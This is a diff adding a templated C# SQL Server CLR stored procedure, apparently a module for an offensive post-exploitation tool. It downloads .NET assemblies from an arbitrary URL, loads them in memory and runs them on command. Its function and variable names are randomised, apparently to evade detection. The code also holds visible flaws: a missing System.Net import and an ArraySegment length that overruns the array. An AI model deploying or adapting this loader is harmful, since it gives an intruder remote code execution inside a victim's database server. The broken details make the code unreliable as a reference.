@@ -1,0 +1,56 @@
+{% if section == "globals" %}
+    using System.IO;
+    using System.Text;
+    using System.Linq;
+    using System.Reflection;
+    using System.Collections.Generic;
+{% elif section == "text" %}
+    private static Dictionary<string, Assembly> {{ "loaded_assemblies" | RNDVAR }} = new Dictionary<string, Assembly>();
+
+    private static string {{ "random_string_fn" | RNDVAR }}(int length)
+    {
+        Random random = new Random();
+        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        return new string(Enumerable.Repeat(chars, length)
+            .Select(s => s[random.Next(s.Length)]).ToArray());
+    }
+
+    private static void {{ "load_assembly_fn" | RNDVAR }}(string uri){
+        if(uri.StartsWith("http")){
+            WebClient myWebClient = new WebClient();
+            var data = myWebClient.DownloadData(uri);
+            {{ "loaded_assemblies" | RNDVAR }}[{{ "random_string_fn" | RNDVAR }}(10)] = Assembly.Load(data);
+        }
+    }
+
+    private static void {{ "list_assembly_fn" | RNDVAR }}(){
+        {{ "response_fn" | RNDVAR }}(String.Join("\n", {{ "loaded_assemblies" | RNDVAR }}.Keys ));
+    }
+
+    private static void {{ "exec_assembly_fn" | RNDVAR }}(string name, string args){
+        var sb = new StringBuilder();
+        var writer = new StringWriter(sb);
+        Console.SetOut(writer);
+
+        {{ "loaded_assemblies" | RNDVAR }}[name].EntryPoint.Invoke(null, new object[]{args.Split(' ')});
+
+        var output = sb.ToString();
+        {{ "response_fn" | RNDVAR }}(output);
+    }
+
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void {{ "assembly_fn" | RNDVAR }}(SqlString command)
+    {
+        string[] cmd = command.Value.Split(' ');
+        string name = cmd[0];
+
+        if (name.StartsWith("load")) {
+            {{ "load_assembly_fn" | RNDVAR }}(cmd[1]);
+        } else if (name.StartsWith("list")) {
+            {{ "list_assembly_fn" | RNDVAR }}();
+        } else if (name.StartsWith("exec")) {
+            var argsSegment = new ArraySegment<string>(cmd, 2, cmd.Length - 1);
+            {{ "exec_assembly_fn" | RNDVAR }}(cmd[1], String.Join(" ", argsSegment));
+        }
+    }
+{% endif %}
